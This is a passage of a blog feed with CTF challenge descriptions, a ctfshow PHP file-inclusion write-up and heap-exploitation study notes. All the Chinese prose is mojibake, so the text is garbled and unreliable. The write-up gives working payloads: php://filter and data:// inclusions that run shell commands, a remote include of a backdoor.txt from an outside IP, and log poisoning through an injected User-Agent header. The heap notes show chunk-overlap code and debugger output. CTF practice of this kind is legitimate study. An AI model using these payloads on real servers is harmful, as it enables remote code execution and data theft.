å‘ç°é€šå¾€ç§˜å¯†èŠ±å›­çš„å°å¾„ï¼Œå…¥å£å´è¢«å°ä¸Šäº†ï¼Œä¸Šé¢æœ‰ä¸€ä¸²å¯†æ–‡ Y2w9Iobe_v_Ufbm0ajI05bfzvTP1b_c}{lrï¼Œè¯·è¾“å…¥å¯†ç å¸®åŠ©è‰¾ç±³è‰æ¢ç´¢ç§˜å¯†èŠ±å›­</p></blockquote><h3 id="ç¿»ä¸€ç¿»-3"><a class="markdownIt-Anchor" href="#ç¿»ä¸€ç¿»-3">#</a> <strong>ç¿»ä¸€ç¿»</strong></h3><p>é¢˜ç›®æè¿°ï¼š</p><blockquote><p>å°æ˜æœ€è¿‘å¤±æ‹äº†ï¼Œç¿»æ¥è¦†å»ç¡ä¸ç€ï¼Œè¯·å¸®ä»–æ‰¾å‡ºå¤±æ‹çš„å…³é”®ä¿¡æ¯</p></blockquote><h3 id="seven-more-3"><a class="markdownIt-Anchor" href="#seven-more-3">#</a> <strong>seven more</strong></h3><p>é¢˜ç›®æè¿°ï¼š</p><blockquote><p>more than more no co-prime</p></blockquote><h3 id="æƒ…ä¹¦ä¸ç ´ç¢çš„è¯ä¹¦-3"><a class="markdownIt-Anchor" href="#æƒ…ä¹¦ä¸ç ´ç¢çš„è¯ä¹¦-3">#</a> <strong>æƒ…ä¹¦ä¸ç ´ç¢çš„è¯ä¹¦</strong></h3><p>é¢˜ç›®æè¿°ï¼š</p><blockquote><p>å°æ˜å–œæ¬¢ä¸Šäº†å°çº¢ï¼Œä»–ä½¿ç”¨ rsa å‘å°çº¢å‘é€äº†æ— æ•°å°å«æœ‰ä¸­æ–‡å­—ç¬¦çš„æƒ…ä¹¦ã€‚ç»ˆäºå°çº¢å¿ä¸ä½äº†ï¼Œæ‰¾åˆ°äº†å¤§å˜¿é˜”å°†å°æ˜çš„ç§é’¥è¯ä¹¦æ‰“æˆç¢ç‰‡ï¼Œç§»é™¤äº†ä¸­é—´çš„å†…å®¹å¹¶æŠŠä¸Šä¸‹æ®µçš„ç§é’¥éƒ¨åˆ†è½¬åŒ–æˆ 16 è¿›åˆ¶ï¼Œä»¥ä¹ä¸ªä¸ºä¸€ç»„ç”¨ç›¸åŒçš„æ–¹å¼æ‰“ä¹±ï¼ˆè½¬åŒ–æ—¶äº§ç”Ÿçš„ 0d0a æ¢è¡Œç¬¦å·²è¢«ç§»é™¤ï¼‰ã€‚ä½œä¸ºå¯†ç å­¦å¤§ä½¬çš„ä½ èƒ½æ¢å¤è¯ä¹¦ï¼Œæ‰¾å‡ºå°çº¢å¿æ— å¯å¿çš„è¯æ®ä¹ˆï¼Ÿ</p><p><strong>æç¤º 1</strong> æƒ…ä¹¦ä¸ç ´ç¢çš„è¯ä¹¦ hint1: å­—ç¬¦ä¸­å«æœ‰ä¸­æ–‡ å¸¸è§„è¾“å‡ºæ–¹æ³•æ— æ•ˆï¼Œè¯·ä½¿ç”¨ PKCS1_OAEP è§£å¯†å™¨ï¼Œå¹¶ä½¿ç”¨ cipher.decrypt () è§£å¯†å¯†æ–‡ï¼ˆæ¯•ç«Ÿè€ƒç‚¹æ˜¯è¯ä¹¦ï¼‰</p></blockquote><h3 id="ä¸åˆæ ¼çš„é­”è¯-3"><a class="markdownIt-Anchor" href="#ä¸åˆæ ¼çš„é­”è¯-3">#</a> <strong>ä¸åˆæ ¼çš„é­”è¯</strong></h3><p>é¢˜ç›®æè¿°ï¼š</p><blockquote><p>åˆšå¼€å§‹å­¦ä¹ é­”è¯çš„å° A æ€»æ˜¯åªå…³æ³¨é­”è¯çš„é¢œè‰²è€Œå¿½ç•¥é…æ¯”ï¼Œè¿™æ¬¡ä»–é…ç½®çš„é­”è¯åˆæ˜¯è¿™æ ·ï¼Œè¿™æ ·ä¸€ä»½ä¸åˆæ ¼çš„é­”è¯å®Œå…¨æ²¡åŠæ³•è¾¾åˆ°å¯¹ä¿¡æ¯ â€œä¿å¯†â€ çš„æ•ˆæœäº†ï¼Œè¯·ä»è¿™ä»½é¢ç›®å…¨éçš„æˆå“ä¸­è¿˜åŸå‡ºå° A æƒ³éšè—çš„ä¿¡æ¯</p></blockquote><h2 id="misc-3"><a class="markdownIt-Anchor" href="#misc-3">#</a> Misc</h2><h3 id="rem_you-2"><a class="markdownIt-Anchor" href="#rem_you-2">#</a> <strong>Rem_You</strong></h3><p>é¢˜ç›®æè¿°ï¼š</p><blockquote></blockquote><h3 id="funny-2"><a class="markdownIt-Anchor" href="#funny-2">#</a> <strong>funny</strong></h3><p>é¢˜ç›®æè¿°ï¼š</p><blockquote çœ-å¸‚-å¹¿åœºåå­—-æ°´è¾¹åå­—=""><p>çœ‹äº†åŠå¤©ç”µè„‘çš„å°æ˜éå¸¸åŠ³ç´¯ï¼Œä¾¿æ‘¸é±¼å»æ¥¼ä¸‹çš„å¹¿åœºé€›ä¸€é€›ä½†è§‰å¾—å¹¿åœºå¤ªåµé—¹äº†ï¼Œåˆå»äº†æ°´è¾¹çœ‹å¤§çˆ·ä»¬é’“é±¼ï¼Œä½ èƒ½æ‰¾å‡ºå°æ˜å»çš„å¹¿åœºå’Œæ°´è¾¹çš„åå­—å˜›</p><p>flag æ ¼å¼  HECTF {åŒ—äº¬å¸‚ - åŒº - å¹¿åœºåå­— - æ°´è¾¹åå­—}   HECTF</p></blockquote><h3 id="ç®€å•çš„å‹ç¼©åŒ…-3"><a class="markdownIt-Anchor" href="#ç®€å•çš„å‹ç¼©åŒ…-3">#</a> <strong>ç®€å•çš„å‹ç¼©åŒ…</strong></h3><p>é¢˜ç›®æè¿°ï¼š</p><blockquote><p>w41tm00n æ˜¯ä¸ª kisaki æ¨ï¼ŒæŸå¤©åœ¨æ°´ç¾¤çš„æ—¶å€™ï¼Œä¸€ä¸ªåŒä¸º kisaki æ¨çš„ g01den åœ¨ç¾¤é‡Œåˆ†äº«äº†ä¸ªå‹ç¼©åŒ…ï¼Œå¹¶ç•™è¨€é‡Œé¢æœ‰ä¸€å¼  kisaki çš„å›¾ï¼ŒåŒæ—¶é‡Œé¢è¿˜å­˜åœ¨ç€ç¥ç§˜çš„ä¿¡æ¯ï¼ˆè¿™é‡Œæ˜¯ flagï¼‰ï¼Œw41tm00n å¯¹æ­¤å¾ˆæ„Ÿå…´è¶£ï¼Œä½ å¯ä»¥å¸®ä»–å¾—åˆ°ç¥ç§˜çš„ä¿¡æ¯ï¼ˆflagï¼‰å—ï¼Ÿ</p></blockquote><h3 id="æ¶åŠ¿åŠ›çš„ä»“åº“-2"><a class="markdownIt-Anchor" href="#æ¶åŠ¿åŠ›çš„ä»“åº“-2">#</a> <strong>æ¶åŠ¿åŠ›çš„ä»“åº“</strong></h3><p>é¢˜ç›®æè¿°ï¼š</p><blockquote><p>æ¶åŠ¿åŠ›çš„ä»“åº“æƒ¨é­æ¯’æ‰‹ï¼Œå°±ä»£è¡¨ç€æ¯’æ‰‹ä¼¸è¿›äº†æ¶åŠ¿åŠ›çš„ä»“åº“</p></blockquote><h3 id="æ¶åŠ¿åŠ›çš„èŠå¤©è®°å½•-2"><a class="markdownIt-Anchor" href="#æ¶åŠ¿åŠ›çš„èŠå¤©è®°å½•-2">#</a> <strong>æ¶åŠ¿åŠ›çš„èŠå¤©è®°å½•</strong></h3><p>é¢˜ç›®æè¿°ï¼š</p><blockquote><p>é™„ä»¶ä¸‹è½½åœ°å€ï¼š é“¾æ¥ï¼š<span class="exturl" data-url="aHR0cHM6Ly9wYW4uYmFpZHUuY29tL3MvMWJHRXFnclJncVo2MVU4VHhBRDdxTkE=">https://pan.baidu.com/s/1bGEqgrRgqZ61U8TxAD7qNA</span>  æå–ç ï¼šo07y</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;ul class=&quot;markdownIt-TOC&quot;&gt;
&lt;li&gt;&lt;a href=&quot;#wp&quot;&gt;WPï¼š&lt;/a&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#web&quot;&gt;Webï¼š&lt;/a&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#are-you-happy&quot;&gt;Are you happy?ï¼š&lt;</summary>
      
    
    
    
    <category term="CTFerçš„æ¯”èµ›ä¹‹è·¯" scheme="http://blog.g01den.top/categories/Game/"/>
    
    
    <category term="Game" scheme="http://blog.g01den.top/tags/Game/"/>
    
  </entry>
  
  <entry>
    <title>ctfshow-æ–‡ä»¶åŒ…å«</title>
    <link href="http://blog.g01den.top/posts/ad175165.html"/>
    <id>http://blog.g01den.top/posts/ad175165.html</id>
    <published>2024-11-24T13:38:01.000Z</published>
    <updated>2024-12-09T13:21:11.773Z</updated>
    
    <content type="html"><![CDATA[<p>ç«äº‰åŒ…å«å…ˆä¸å†™äº†ï¼Œæœ‰æ—¶é—´å†å†™ã€‚</p><h1 id="web78"><a class="markdownIt-Anchor" href="#web78">#</a> Web78</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹å¸¸è§„æ–‡ä»¶åŒ…å«ï¼Œç›´æ¥è¯» flag.phpï¼Œfilter ä¼ªåè®®ï¼š</p><blockquote><p>?file=php://filter/read=convert.base64-encode/resource=flag.php</p></blockquote><h1 id="web79"><a class="markdownIt-Anchor" href="#web79">#</a> Web79ï¼š</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹è¿™æ¬¡æœ‰ç‚¹ä¸ä¸€æ ·ï¼Œå¸¦äº†ä¸ª str_replace æ›¿æ¢ï¼Œæ‰€ä»¥è¯»æ–‡ä»¶ä¼°è®¡å±é™©ï¼Œæ‰“ä¸€æ‰“å¦å¤–çš„æ“ä½œ</p><blockquote><p>?file=data://text/plain,<?=`tac f*`;?></p></blockquote><h1 id="web80"><a class="markdownIt-Anchor" href="#web80">#</a> Web80ï¼š</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="è§£æ³•ä¸€"><a class="markdownIt-Anchor" href="#è§£æ³•ä¸€">#</a> è§£æ³•ä¸€ï¼š</h2><p>â€‹è¿œç¨‹æ–‡ä»¶åŒ…å«ï¼Œç›´æ¥åœ¨æœåŠ¡å™¨ä¸Šå†™ä¸€ä¸ª txt æ–‡ä»¶ï¼Œä¹‹å http åè®®åŒ…å«å³å¯ã€‚</p><blockquote><p>?file=http://39.107.158.17/backdoor.txt</p></blockquote><h2 id="è§£æ³•äºŒ"><a class="markdownIt-Anchor" href="#è§£æ³•äºŒ">#</a> è§£æ³•äºŒï¼š</h2><p>â€‹åŒ…å«æ—¥å¿—æ–‡ä»¶ï¼š</p><p>â€‹é€šè¿‡ burp æŠ“åŒ…ï¼Œæ”¹ user-agentï¼Œåœ¨å…¶åé¢åŠ ä¸€ä¸ª php ä»£ç ï¼Œæ¯”å¦‚ phpinfoï¼Œ</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>204e30c6-d77b-4e30-8694-5a79d576baf9.challenge.ctf.show</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0 &lt;?php phpinfo();?&gt;</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Sec-Fetch-Dest</span><span class="punctuation">: </span>document</span><br><span class="line"><span class="attribute">Sec-Fetch-Mode</span><span class="punctuation">: </span>navigate</span><br><span class="line"><span class="attribute">Sec-Fetch-Site</span><span class="punctuation">: </span>cross-site</span><br><span class="line"><span class="attribute">Priority</span><span class="punctuation">: </span>u=0, i</span><br><span class="line"><span class="attribute">Te</span><span class="punctuation">: </span>trailers</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>â€‹ä¹‹åè®¿é—®ï¼Ÿfile=/var/log/nginx/access.log è¿™ä¸ªæ–‡ä»¶å³å¯ã€‚</p><h1 id="web81"><a class="markdownIt-Anchor" href="#web81">#</a> Web81</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹å’Œä¸Šä¸€é¢˜ä¸€æ ·ï¼Œæ—¥å¿—æ–‡ä»¶åŒ…å«ï¼Ÿfile=/var/log/nginx/access.log è¿™ä¸ªæ–‡ä»¶ã€‚</p><h1 id="web88"><a class="markdownIt-Anchor" href="#web88">#</a> Web88ï¼š</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/php|\~|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\-|\_|\+|\=|\./i&quot;</span>, <span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹æ²¡æœ‰è¿‡æ»¤å†’å·ï¼Œè±†å·ï¼Œæ–œæ å’Œåˆ†å·ï¼Œdata åè®®æ‰“ base64ï¼Œå»æ‰æœ«å°¾çš„ç­‰å·ï¼š</p><blockquote><p>?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCd0YWMgKicpOw</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;ç«äº‰åŒ…å«å…ˆä¸å†™äº†ï¼Œæœ‰æ—¶é—´å†å†™ã€‚&lt;/p&gt;
&lt;h1 id=&quot;web78&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#web78&quot;&gt;#&lt;/a&gt; Web78&lt;/h1&gt;
&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;</summary>
      
    
    
    
    <category term="Webç‹—çš„è‡ªæˆ‘å®‰æ…°" scheme="http://blog.g01den.top/categories/Web/"/>
    
    
    <category term="Web" scheme="http://blog.g01den.top/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>pwnå­¦ä¹ ç¬”è®°ï¼ˆ12ï¼‰--Chunk Extend and Overlapping</title>
    <link href="http://blog.g01den.top/posts/d1a08bca.html"/>
    <id>http://blog.g01den.top/posts/d1a08bca.html</id>
    <published>2024-11-11T11:51:40.000Z</published>
    <updated>2024-11-11T11:55:32.756Z</updated>
    
    <content type="html"><![CDATA[<h1 id="pwnå­¦ä¹ ç¬”è®°12chunk-extend-and-overlapping"><a class="markdownIt-Anchor" href="#pwnå­¦ä¹ ç¬”è®°12chunk-extend-and-overlapping">#</a> pwn å­¦ä¹ ç¬”è®°ï¼ˆ12ï¼‰â€“Chunk Extend and Overlapping</h1><p>â€‹chunk extend æ˜¯å †æ¼æ´çš„ä¸€ç§å¸¸è§åˆ©ç”¨æ‰‹æ³•ï¼Œé€šè¿‡ extend å¯ä»¥å®ç° chunk overlappingï¼ˆå—é‡å ï¼‰ çš„æ•ˆæœã€‚è¿™ç§åˆ©ç”¨æ–¹æ³•éœ€è¦ä»¥ä¸‹çš„æ—¶æœºå’Œæ¡ä»¶ï¼š</p><ul><li>ç¨‹åºä¸­å­˜åœ¨åŸºäºå †çš„æ¼æ´</li><li>æ¼æ´å¯ä»¥æ§åˆ¶ chunk header ä¸­çš„æ•°æ®</li></ul><h2 id="1-å¯¹inuseçš„fastbinè¿›è¡Œextend"><a class="markdownIt-Anchor" href="#1-å¯¹inuseçš„fastbinè¿›è¡Œextend">#</a> 1ã€å¯¹ inuse çš„ fastbin è¿›è¡Œ extendï¼š</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"> <span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">void</span> *ptr,*ptr1;</span><br><span class="line"></span><br><span class="line">    ptr=<span class="built_in">malloc</span>(<span class="number">0x10</span>);<span class="comment">//åˆ†é…ç¬¬ä¸€ä¸ª0x10çš„chunk</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>);<span class="comment">//åˆ†é…ç¬¬äºŒä¸ª0x10çš„chunk</span></span><br><span class="line"></span><br><span class="line">    *(<span class="type">long</span> <span class="type">long</span> *)((<span class="type">long</span> <span class="type">long</span>)ptr<span class="number">-0x8</span>)=<span class="number">0x41</span>;<span class="comment">// ä¿®æ”¹ç¬¬ä¸€ä¸ªå—çš„sizeåŸŸ</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(ptr);</span><br><span class="line">    ptr1=<span class="built_in">malloc</span>(<span class="number">0x30</span>);<span class="comment">// å®ç° extendï¼Œæ§åˆ¶äº†ç¬¬äºŒä¸ªå—çš„å†…å®¹</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹é¦–å…ˆè¿›è¡Œä¸¤æ¬¡ mallocï¼Œä¹‹åçœ‹çœ‹ heap çš„çŠ¶æ€ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">In file: /mnt/hgfs/sharedict/ChunkExtend/extend.c</span><br><span class="line">    3     void *ptr,*ptr1;</span><br><span class="line">    4 </span><br><span class="line">    5     ptr=malloc(0x10);//åˆ†é…ç¬¬ä¸€ä¸ª0x10çš„chunk</span><br><span class="line">    6     malloc(0x10);//åˆ†é…ç¬¬äºŒä¸ª0x10çš„chunk</span><br><span class="line">    7 </span><br><span class="line"> â–º  8     *(long long *)((long long)ptr-0x8)=0x41;// ä¿®æ”¹ç¬¬ä¸€ä¸ªå—çš„sizeåŸŸ</span><br><span class="line">    9 </span><br><span class="line">   10     free(ptr);</span><br><span class="line">   11     ptr1=malloc(0x30);// å®ç° extendï¼Œæ§åˆ¶äº†ç¬¬äºŒä¸ªå—çš„å†…å®¹</span><br><span class="line">   12     return 0;</span><br><span class="line">   13 &#125;</span><br><span class="line">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ STACK ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span><br><span class="line">00:0000â”‚ rsp 0x7fffffffde30 â€”â–¸ 0x555555758010 â—‚â€” 0x0</span><br><span class="line">01:0008â”‚     0x7fffffffde38 â—‚â€” 0x0</span><br><span class="line">02:0010â”‚ rbp 0x7fffffffde40 â€”â–¸ 0x5555555546e0 (__libc_csu_init) â—‚â€” push   r15</span><br><span class="line">03:0018â”‚     0x7fffffffde48 â€”â–¸ 0x7ffff7a2d840 (__libc_start_main+240) â—‚â€” mov    edi, eax</span><br><span class="line">04:0020â”‚     0x7fffffffde50 â—‚â€” 0x1</span><br><span class="line">05:0028â”‚     0x7fffffffde58 â€”â–¸ 0x7fffffffdf28 â€”â–¸ 0x7fffffffe2ac â—‚â€” &#x27;/mnt/hgfs/sharedict/ChunkExtend/test&#x27;</span><br><span class="line">06:0030â”‚     0x7fffffffde60 â—‚â€” 0x1f7ffcca0</span><br><span class="line">07:0038â”‚     0x7fffffffde68 â€”â–¸ 0x55555555468a (main) â—‚â€” push   rbp</span><br><span class="line">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ BACKTRACE ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span><br><span class="line"> â–º f 0   0x5555555546aa main+32</span><br><span class="line">   f 1   0x7ffff7a2d840 __libc_start_main+240</span><br><span class="line">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">heap</span></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555758000</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555758020</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555758040</span><br><span class="line">Size: 0x20fc1</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">bins</span></span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x0</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>â€‹æœ‰åœ°å€çš„è¯ï¼Œå°±å»è¯»ä¸€ä¸‹ä¸¤ä¸ªå 